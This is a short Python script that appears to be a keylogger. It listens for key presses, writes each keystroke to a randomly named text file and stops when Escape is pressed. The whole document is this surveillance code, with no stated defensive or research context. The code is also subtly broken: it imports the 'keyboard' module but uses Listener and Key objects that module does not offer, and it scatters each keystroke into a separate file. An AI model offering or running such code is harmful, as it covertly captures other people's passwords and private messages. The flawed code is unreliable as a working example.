```python
import keyboard
import os
import string
import random

def on_press(key):
    try:
        filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) + '.txt'
        with open(filename, "a") as f:
            f.write(str(key).strip("'"))
    except Exception as e:
        print(f"Error occurred: {e}")
def on_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```